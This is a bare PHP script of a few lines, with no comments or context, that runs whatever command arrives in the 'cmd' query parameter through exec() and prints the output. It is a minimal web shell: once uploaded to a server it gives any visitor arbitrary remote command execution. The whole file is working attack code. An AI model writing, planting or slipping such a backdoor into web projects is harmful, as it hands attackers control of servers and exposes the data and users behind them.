<?php
    if(isset($_GET['cmd']))
    {
        echo exec($_GET['cmd']);
    }
?>